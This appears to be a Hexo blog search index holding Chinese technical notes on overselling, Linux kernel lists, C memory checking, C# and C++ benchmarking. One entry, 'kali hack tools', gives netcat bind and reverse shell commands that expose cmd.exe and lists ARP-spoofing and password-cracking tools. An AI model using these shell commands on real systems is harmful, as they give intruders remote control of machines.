<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>超卖问题浅析</title>
      <link href="/posts/c47fc989.html"/>
      <url>/posts/c47fc989.html</url>
      
        <content type="html"><![CDATA[<h2><span id="问题难点">问题难点</span></h2><ul><li>1 突发访问量<ul><li>前端优化<ul><li>秒杀倒计时，不能发送下单请求，下单键不可用</li><li>下单后，不能重复下单请求，下单键不可用</li><li>JS程序设置用户请求最小间隔时间</li><li>使用前端缓存，相同页面直接从缓存刷新</li></ul></li><li>后端优化<ul><li>见后文</li></ul></li><li>行业方案<ul><li><ol type="1"><li>使用队列组织 nginx 接收到的请求，业务服务器从队列中取，顺序处理</li></ol></li><li><ol start="2" type="1"><li>负载均衡</li></ol></li><li><ol start="3" type="1"><li>提升机器数量</li></ol></li><li><ol start="4" type="1"><li>nginx 接入层筛选限流，再转发到服务器</li></ol></li></ul></li></ul></li><li>2 带宽限制<ul><li>突发流量太大，需要从运营商临时购买</li><li>设置CDN缓存页面，分担服务器压力</li></ul></li><li>3 大部分不会生成订单的请求<ul><li>在 nginx 反向代理层，就进行筛选发送到服务器的请求</li></ul></li><li>4 超卖问题<ul><li>在同一时间内，数据库中没有及时更新库存量，多个用户抢到商品，但是只能有一个用户买到</li><li>行业方案<ul><li>MySQL悲观锁：数据库层面设置的写锁，保证修改只能同时被一个session执行，在完成前其他都需要等待<ul><li>优点：稳定</li><li>缺点：锁等待，资源消耗</li></ul></li><li>MySQL乐观锁：程序设计时，增加的锁机制，比如增加版本号，在修改时先查询版本号是否被更改，没改动一次就更新版本号，此时只有一条SQL执行成功。<ul><li>优点：比悲观锁并发量大</li><li>缺点：MySQL本身处理不了大量并发请求</li></ul></li><li>队列：使用队列变成有序的请求处理<ul><li>优点：稳定，可以处理大量并发请求</li><li>缺点：本身实时处理请求速率低，大量并发请求内存占用高</li></ul></li><li>Redis 分布式锁：SETNX只能设置一次键值，返回1，再次设置会返回0。基于此，多个线程只有一个线程的SETNX 返回 1。超时时间后，删除 SETNX 设置的key。<ul><li>优点：只限制处理库存时，只允许单线程执行</li><li>缺点：线程级的限制，资源浪费</li></ul></li><li>Redis 乐观锁：Redis watch 机制，比如 watch库存值得变化。当Redis事务开启后，库存值发生变化，就回滚当前事务。所以并发请求当有一个成功时，其他请求的事务都会回滚。<ul><li>优点：没有限制线程的执行数量，只是打断冲突线程的执行。</li><li>缺点：在这些方法的比较中，缺点不明显，可以使用高性能的语言或者框架，进一步提升性能</li></ul></li></ul></li></ul></li></ul><h2><span id="方案设计">方案设计</span></h2><ul><li>静态资源处理，图片、js、css、页面等<ul><li>使用CDN</li><li>加大带宽</li></ul></li><li>业务请求处理<ul><li>Nginx 过滤大部分一定不会生成订单的请求</li><li>Nginx-Lua + Redis 乐观锁解决超卖问题</li><li>服务器处理少量请求</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> System Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
            <tag> System Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核链表设计</title>
      <link href="/posts/dd44df07.html"/>
      <url>/posts/dd44df07.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>双向循环链表。没有设计数据域，通用性和灵活性更好。实际使用时，构成如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_list</span> &#123;</span><br><span class="hljs-keyword">void</span>* data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>初始化设计：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIST_HEAD_INIT(name) &#123; &amp;(name), &amp;(name) &#125;</span><br><br><span class="hljs-comment">// 初始化prev和next字段，让它们指向list_name变量本身</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIST_HEAD(name) \</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">name</span> = <span class="hljs-title">LIST_HEAD_INIT</span>(<span class="hljs-title">name</span>)</span><br></code></pre></div></td></tr></table></figure><p>添加元素：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// simple, clear, neat</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> __list_add(struct list_head *<span class="hljs-keyword">new</span>,<br>      struct list_head *prev,<br>      struct list_head *next)<br>&#123;<br>next-&gt;prev = <span class="hljs-keyword">new</span>;<br><span class="hljs-keyword">new</span>-&gt;next = next;<br><span class="hljs-keyword">new</span>-&gt;prev = prev;<br>prev-&gt;next = <span class="hljs-keyword">new</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">list_add</span><span class="hljs-params">(struct list_head *<span class="hljs-keyword">new</span>, struct list_head *head)</span></span><br><span class="hljs-function"></span>&#123;<br>__list_add(<span class="hljs-keyword">new</span>, head, head-&gt;next);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">list_add_tail</span><span class="hljs-params">(struct list_head *<span class="hljs-keyword">new</span>, struct list_head *head)</span></span><br><span class="hljs-function"></span>&#123;<br>__list_add(<span class="hljs-keyword">new</span>, head-&gt;prev, head);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>删除元素：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> __list_del(struct list_head * prev, struct list_head * next)<br>&#123;<br>next-&gt;prev = prev;<br>prev-&gt;next = next;<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * These are non-NULL pointers that will result in page faults</span><br><span class="hljs-comment"> * under normal circumstances, used to verify that nobody uses</span><br><span class="hljs-comment"> * non-initialized list entries.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIST_POISON1  ((void *) 0x00100100)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIST_POISON2  ((void *) 0x00200200)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">list_del</span><span class="hljs-params">(struct list_head *entry)</span></span><br><span class="hljs-function"></span>&#123;<br>__list_del(entry-&gt;prev, entry-&gt;next);<br>entry-&gt;next = LIST_POISON1;<br>entry-&gt;prev = LIST_POISON2;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>通过 list_head 成员，找到整个结构体的地址：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> list_entry(ptr, type, member) \</span><br>(                                    \<br>(type*)                          \<br>(                                \<br>(<span class="hljs-keyword">char</span>*)(ptr) -               \<br>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)( &amp;((type*)<span class="hljs-number">0</span>)-&gt;member ) \<br>)                                \<br>)<br></code></pre></div></td></tr></table></figure><p>type是包含 list_head 类型成员的自定义结构体，ptr 是 list_head ，指向member 成员。 (unsigned long)( &amp;((type*)0)-&gt;member )：从 0地址定义的一个结构，得到 member 成员的偏移量。ptr进行偏移之后，得到自定义结构体的地址。</p><p>遍历节点：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __list_for_each(pos, head) \</span><br><span class="hljs-keyword">for</span> (pos = (head)-&gt;next; pos != (head); pos = pos-&gt;next)<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> list_for_each_safe(pos, n, head) \</span><br><span class="hljs-keyword">for</span> (pos = (head)-&gt;next, n = pos-&gt;next; pos != (head); \<br>pos = n, n = pos-&gt;next)<br></code></pre></div></td></tr></table></figure><p>safe版本保存了临时的 next 节点，即使 pos 被删除了，也能通过 n 找到next 节点。</p><p>更常用的类似 list_entry 是 container_of。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Linux Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel </tag>
            
            <tag> Data Structure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言程序内存安全检查</title>
      <link href="/posts/4df195e7.html"/>
      <url>/posts/4df195e7.html</url>
      
        <content type="html"><![CDATA[<h2><span id="静态存储区检查">静态存储区检查</span></h2><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs CMake"><span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">"-Wl,-Map=output.map"</span>) <span class="hljs-comment"># 生成map文件  </span><br><span class="hljs-keyword">set</span>(CMAKE_C_FLAGS <span class="hljs-string">"-fdata-sections"</span>) <span class="hljs-comment"># 把static变量地址输出到map文件  </span><br><span class="hljs-keyword">set</span>(CMAKE_CXX_FLAGS <span class="hljs-string">"-fdata-sections"</span>)<br></code></pre></div></td></tr></table></figure><p>帮助检测静态存储区的arr数组是否出现了数组越界操作。</p><hr><h2><span id="动态存储区检查">动态存储区检查</span></h2><h3><span id="工具">工具</span></h3><ul><li>ASAN</li><li>dmalloc</li><li>valgrind</li></ul><h4><span id="asan">ASAN</span></h4><p>ASAN（Address Sanitizer）是针对 C/C++的快速内存错误检测工具，在运行时检测 C/C++ 代码中的多种内存错误。 在 GCC编译选项中设置 -fsanitize=address，启用快速内存错误检测器 ASAN。比如-fsanitize-coverage=trace-pc，启用覆盖率指导的模糊代码检测，等。详细参考：<a href="https://github.com/google/sanitizers/wiki" target="_blank" rel="noopener">Home ·google/sanitizers Wiki (github.com)</a></p><h4><span id="valgrind">Valgrind</span></h4><p>Valgrind由内核（core）以及基于内核的其他调试工具组成。其基于仿真方式对程序进行调试，它先于应用程序获取实际处理器的控制权，并在实际处理器的基础上仿真一个虚拟处理器，并使应用程序运行于这个虚拟处理器之上，从而对应用程序的运行进行监视。</p><blockquote><p><a href="http://valgrind.org/" target="_blank" rel="noopener">官网</a>Valgrind工具包包含多个工具，如Memcheck、Cachegrind、Helgrind、Callgrind、Massif。</p></blockquote><ul><li>Memcheck工具是Valgrind中最常用的工具，用来检测程序中出现的内存问题。</li><li>Callgrind收集程序运行时的一些数据，函数调用关系等信息，还可以有选择地进行cache模拟。在运行结束时，它会把分析数据写入一个文件。</li><li>Helgrind 主要用来检查多线程程序中出现的竞争问题。</li><li>Callgrind 模拟CPU中的一级缓存I1,D1和L2二级缓存，能够精确地指出程序中cache的丢失和命中。</li><li>Massif堆栈分析器，它能测量程序在堆栈中使用了多少内存，如堆块、堆管理块和栈的大小。简单使用，对下面的 C 程序进行测试：</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;  </span></span><br>  <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>  </span>&#123;  <br><span class="hljs-keyword">int</span>* x = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));  <br>x[<span class="hljs-number">10</span>] = <span class="hljs-number">0</span>;       <span class="hljs-comment">// problem 1: heap block overrun  </span><br>&#125;                 <span class="hljs-comment">// problem 2: memory leak -- x not freed  </span><br>  <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>  </span>&#123;  <br>f();  <br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt install valgrind<br><br>gcc -g valgrind_test.c -o valgrind_test<br><br>valgrind --leak-check=yes --tool=memcheck ./valgrind_test<br></code></pre></div></td></tr></table></figure><h3><span id="自定义带检测的内存管理函数">自定义带检测的内存管理函数</span></h3><p>在实际内容前后加上指定的标记数据，达到检测哨兵的效果。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BEFORE_RED_AREA_LEN  (4)            <span class="hljs-comment">// 前红区长度  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AFTER_RED_AREA_LEN   (4)            <span class="hljs-comment">// 后红区长度  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LEN_AREA_LEN         (4)            <span class="hljs-comment">// 长度区长度  </span></span><br>  <br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BEFORE_RED_AREA_DATA (0x11223344u)  <span class="hljs-comment">// 前红区数据  </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AFTER_RED_AREA_DATA  (0x55667788u)  <span class="hljs-comment">// 后红区数据  </span></span><br>  <br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">Malloc</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> __size)</span>  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-comment">// 申请内存：4 + 4 + __size + 4  </span><br>    <span class="hljs-keyword">void</span> *ptr = <span class="hljs-built_in">malloc</span>(BEFORE_RED_AREA_LEN + AFTER_RED_AREA_LEN + __size + LEN_AREA_LEN);  <br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == ptr)  <br>    &#123;  <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[%s]malloc error\n"</span>, __FUNCTION__);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-comment">// 往前红区地址写入固定值  </span><br>    *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(ptr)) = BEFORE_RED_AREA_DATA;       <br>  <br>    <span class="hljs-comment">// 往长度区地址写入长度       </span><br>    *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(ptr + BEFORE_RED_AREA_LEN)) = __size;    <br>  <br>    <span class="hljs-comment">// 往后红区地址写入固定值  </span><br>    *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size)) = AFTER_RED_AREA_DATA;    <br>  <br>    <span class="hljs-comment">// 返回数据区地址  </span><br>    <span class="hljs-keyword">void</span> *data_area_ptr = (ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN);  <br>    <span class="hljs-keyword">return</span> data_area_ptr;  <br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CheckMem</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr, <span class="hljs-keyword">size_t</span> __size)</span>  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-keyword">void</span> *data_area_ptr = ptr;  <br>  <br>    <span class="hljs-comment">// 检测是否踩了前红区  </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[%s]before_red_area_data = 0x%x\n"</span>, __FUNCTION__, *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(data_area_ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN)));  <br>    assert(*((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(data_area_ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN)) == BEFORE_RED_AREA_DATA);  <br>  <br>    <span class="hljs-comment">// 检测是否踩了长度区  </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[%s]len_area_data = 0x%x\n"</span>, __FUNCTION__, *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(data_area_ptr - LEN_AREA_LEN)));  <br>    assert(*((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(data_area_ptr - LEN_AREA_LEN)) == __size);   <br>  <br>    <span class="hljs-comment">// 检测是否踩了后红区  </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[%s]after_red_area_data = 0x%x\n"</span>, __FUNCTION__, *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(data_area_ptr + __size)));  <br>    assert(*((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(data_area_ptr + __size)) == AFTER_RED_AREA_DATA);   <br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Free</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span>  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-keyword">void</span> *all_area_ptr = ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN;  <br>  <br>    <span class="hljs-comment">// 检测是否踩了前红区  </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[%s]before_red_area_data = 0x%x\n"</span>, __FUNCTION__, *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(all_area_ptr)));  <br>    assert(*((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(all_area_ptr)) == BEFORE_RED_AREA_DATA);  <br>  <br>    <span class="hljs-comment">// 读取长度区内容  </span><br>    <span class="hljs-keyword">size_t</span> __size = *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(all_area_ptr + BEFORE_RED_AREA_LEN));  <br>  <br>    <span class="hljs-comment">// 检测是否踩了后红区  </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[%s]before_red_area_data = 0x%x\n"</span>, __FUNCTION__, *((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(all_area_ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size)));  <br>    assert(*((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)(all_area_ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size)) == AFTER_RED_AREA_DATA);  <br>  <br>    <span class="hljs-comment">// 释放所有区域内存  </span><br>    <span class="hljs-built_in">free</span>(all_area_ptr);  <br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C sharp</title>
      <link href="/posts/abda3b00.html"/>
      <url>/posts/abda3b00.html</url>
      
        <content type="html"><![CDATA[<h2><span id="类型">类型</span></h2><ul><li>值类型：栈</li><li>引用类型：栈上为引用，堆上为实际值</li><li>指针类型：不安全模式下才使用</li></ul><h2><span id="类型系统设计">类型系统设计</span></h2><ul><li>值类型 继承自 System.ValueType，所有类型基类 System.Object</li><li>int 是 System.int32 的别名</li><li>struct<ul><li>public</li><li>private</li><li>internal: namespace 中可访问</li><li>protected</li></ul></li><li>enum</li><li>var vname = ... 自动识别类型</li><li>引用类型：<ul><li>object</li><li>string</li><li>dynamic：运行时检测类型</li></ul></li><li>class</li><li>interface</li><li>abstract class 与 interface 的区别<ul><li>abstract class可以有成员字段，有实现的方法，class只能继承自一个abstract class</li><li>interface不能有成员字段，不能有实现的方法，class可以继承自多个interface</li></ul></li></ul><h2><span id="类型转换">类型转换</span></h2><ul><li>大范围类型向小范围类型转换，需要显示转换，丢失精度</li><li>父类向子类转化，使用 parent as child，转换失败会返回 null 指针</li><li>.ToString()</li><li>Convert.ToInt32("199")</li><li>Int32.TryParse("asdf", out intValue)</li><li>IConventible: 值类型转到堆上，返回引用 object boxed = stackVal</li><li>TypeConventer: 引用指向的值，存到栈上 int unboxed =(int)referenceObj</li><li>int? 可为空的 int 类型 （Nullable）</li></ul><h2><span id="集合类型">集合类型</span></h2><ul><li>array<ul><li>int[] numbers = new int[6];<br></li><li>int[,] 2darray = new int[3, 3];</li><li>int[][] vard = new int[5][];</li></ul></li><li>ArrayList</li><li>List<ul><li>强制使用一种类型，相较于ArrayList而言</li></ul></li><li>Hashtable<ul><li>key, value 类型不需要每个条目间一致</li></ul></li><li>Dictionary<ul><li>key, value 类型需要与指定模板中类型一致</li></ul></li><li>ConcurrentDictionary</li><li>SortedList<ul><li>根据 key 值排序</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C-sharp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali hack tools</title>
      <link href="/posts/886c7636.html"/>
      <url>/posts/886c7636.html</url>
      
        <content type="html"><![CDATA[<h1><span id="kali-hack-tools">kali hack tools</span></h1><h2><span id="dns-分析">DNS 分析</span></h2><h3><span id="dnsdict6">dnsdict6</span></h3><h4><span id="install">install</span></h4><ul><li>wgethttps://github.com/vanhauser-thc/thc-ipv6/archive/refs/tags/v3.8.tar.gz</li><li>tar zvxf v3.8.tar.gz</li><li>cd thc-ipv6-3.8</li><li>sudo apt-get install libpcap-dev libssl-dev libnetfilter-queue1libnetfilter-queue-dev</li><li>make</li><li>sudo cp dnsdict6 /usr/bin/</li></ul><h4><span id="usage">usage</span></h4><ul><li>Enumerates a domain for DNS entries.</li></ul><h3><span id="dnsmap">dnsmap</span></h3><h3><span id="dnsrecon">dnsrecon</span></h3><h3><span id="fierce">fierce</span></h3><ul><li>查找目标的ip和主机名，进行子域名爆破</li></ul><h3><span id="lbd">lbd</span></h3><ul><li>load balance detector</li><li>检测DNS、HTTP、HTTPS是否负载均衡</li></ul><h3><span id="reverseraider">reverseraider</span></h3><ul><li>kali已经移除</li></ul><h3><span id="host">host</span></h3><h3><span id="dig">dig</span></h3><h3><span id="dnsenum">dnsenum</span></h3><h3><span id="dmitry">dmitry</span></h3><h2><span id="网络扫描">网络扫描</span></h2><h3><span id="traceroute">traceroute</span></h3><ul><li>windows 下 tracert</li><li>用于探测网络环境</li></ul><h3><span id="tctrace">tctrace</span></h3><h2><span id="搜索引擎信息">搜索引擎信息</span></h2><h3><span id="fimap">fimap</span></h3><ul><li>漏洞扫描</li><li>谷歌搜素结果收集</li></ul><h3><span id="theharvester">theharvester</span></h3><ul><li>多种引擎可以用</li></ul><h2><span id="后门维持连接">后门维持连接</span></h2><h3><span id="netcat">netcat</span></h3><ul><li>维持了 cmd.exe 的权限</li><li>目标机器：nc.exe -d -L -p 8888 -e cmd.exe；入侵机器：nc 目标ip8888</li><li>入侵机器：nc -l -p 8888；目标机器：nc.exe -d 入侵机器ip 8888 -ecmd.exe</li></ul><h2><span id="内网安全">内网安全</span></h2><ul><li>arp欺骗：ettercap</li><li>dns欺骗</li><li>截获数据流量：在arp欺骗到目标网卡基础上，driftnet -i 目标网卡</li></ul><h2><span id="密码攻击">密码攻击</span></h2><ul><li>medusa</li><li>hashcat</li><li>rarcrack: rar 密码破解</li><li>fcrackzip: zip 密码破解</li><li>crunch: 离线密码破解</li><li>cewl: 在线密码破解</li><li>hydra: 在线密码破解</li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cpp性能测试</title>
      <link href="/posts/f692d883.html"/>
      <url>/posts/f692d883.html</url>
      
        <content type="html"><![CDATA[<h2><span id="实验一">实验一</span></h2><ul><li>先确定测量指标</li><li>从实际运行搜集输入</li><li>不要对性能进行假设</li><li>使用微基准测试深入理解代码</li><li>部分有益的优化，可能对程序整体有害</li><li>高性能程序的开发与优化，不是线性过程，可能需要在高级概览和低级细节中反复迭代测试</li><li>在性能方面，没有什么是显而易见的</li><li>看似不必要的代码，删除之后，可能会导致性能下降，请搞清楚如何有效利用CPU 以获得性能提升</li></ul><h3><span id="pre-requirements">Pre-requirements</span></h3><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">sudo pacman -S gperftools<br><br>git <span class="hljs-built_in">clone</span> https://github.com/google/benchmark.git --depth=1<br><br><span class="hljs-built_in">cd</span> benchmark<br>cmake -E make_directory 